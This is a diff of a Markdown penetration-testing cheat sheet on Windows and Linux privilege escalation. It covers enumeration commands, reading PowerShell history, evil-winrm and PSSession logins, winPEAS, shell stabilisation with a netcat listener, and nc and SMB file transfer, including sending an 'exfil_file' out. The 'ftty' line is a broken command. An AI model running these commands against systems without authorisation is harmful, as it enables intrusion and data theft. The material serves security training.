@@ -1,6 +1,8 @@
 # Privilege Escalation
 
 ## Windows
+Credits:
+[Reference](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 Connect to windows machine:
 ```
@@ -19,62 +21,85 @@ python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systemin
 
 ### Manual
 
-Username:
+#### Users:
 ```
 whoami
 ```
+
+Powershell:
 ```
 Get-LocalUser
 ```
 
-Groups username is in:
+##### Groups username is in:
 ```
 whoami /groups
 ```
+
+Powershell:
 ```
 Get-LocalGroup
 ```
 
-Get all system users:
+##### Get all system users:
 ```
 net user
 ```
 
-Information about a group:
+##### Information about a group:
 ```
 Get-LocalGroupMember GroupName
 ```
 
-Get password policy:
+##### History
+Read command history:
 ```
-net accounts
+Get-History
 ```
 
-System Information:
+```
+(Get-PSReadlineOption).HistorySavePath
+type output
+```
+
+#### System Information:
 ```
 systeminfo
 ```
 
-Get patches and updates:
+##### Get patches and updates:
 ```
 wmic qfe
 ```
 
-List all network interfaces:
+#### Get password policy:
+```
+net accounts
+```
+
+#### Network
+
+##### List all network interfaces:
 ```
 ipconfig /all
 ```
 
-Print routing table:
+##### Print routing table:
 ```
 route print
 ```
 
-List all active network connections:
+##### List all active network connections:
 ```
 netstat -ano
 ```
 
+##### Arp table
+```
+arp -a
+```
+
+#### Programs in Windows machine
 We can query two registry keys756 to list both 32-bit and 64-bit applications in the Windows Registry:
 
 For 32-bit:
@@ -86,6 +111,8 @@ For 64-bit:
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ```
 
+#### Process Running
+
 Check processes running in machine:
 ```
 Get-Processes
@@ -96,7 +123,7 @@ Check startup programs:
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 ```
 
-
+#### Find files or directories in a machine
 
 Find some files with extension txt and ini from `C:\`  directory:
 ```
@@ -113,15 +140,6 @@ Checking ownership of a file:
 dir /q C:\Path\to\file.ext
 ```
 
-Read command history:
-```
-Get-History
-```
-
-```
-(Get-PSReadlineOption).HistorySavePath
-type output
-```
 
 Try to run some commands as another user (this on pops another terminal so you show use Windows GUI):
 ```
@@ -135,13 +153,13 @@ $cred = New-Object System.Management.Automation.PSCredential("username", $passwo
 Enter-PSSession -ComputerName ComputerName -Credential $cred
 ```
 
-Using evil-winrm for remote connection:
+Using evil-winrm for a remote connection:
 ```
 evil-winrm -i $rhosts -u username -p "password"
 ```
 
-### Automated
-Using winPEAS
+### Automated scripts
+Using [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20231015-0ad0e48c)
 ```
 .\winPEASx64.exe
 ```
@@ -240,21 +258,27 @@ Reverse shell:
 
 Credits:
 [Ansible Playbook Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/)
-
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 ## Stabilize shell:
+
+After getting a shell, try to spawn a terminal with this command:
 ```
 python -c "import pty;pty.spawn('/bin/bash')"
 ```
 
+Enter CTRL+z and then type this command:
 ```
-ctrl+z
-```
-
-```
-ftty
+ftty raw -echo; fg
 ```
 
-or use rlwrap:
+Set the terminal emulator to xterm:
+```
+export TERM=xterm
+```
+
+Done!
+
+OR use rlwrap:
 ```
 rlwrap nc -vnlp $lport
 ```
@@ -721,13 +745,21 @@ scp root@191.162.0.2:/writing/article/scp.zip hostinger@11.10.0.1:/publishing
 ```
 
 ### nc
+Machine that you have a file:
 ```
-nc -lvnp 4444 > new_file
-nc -vn <IP> 4444 < exfil_file
+nc -lvnp $lport > new_file
 ```
+
+Machine that you want a file to be transfered:
+```
+nc -vn <IP> $lport < exfil_file
+```
+
 ### SMB
 
 Via set a smbserver impacket-smbserver:
 ```
 impacket-smbserver -smb2support sharename /path/to/share
 ```
+
+Then, use copy to get the file
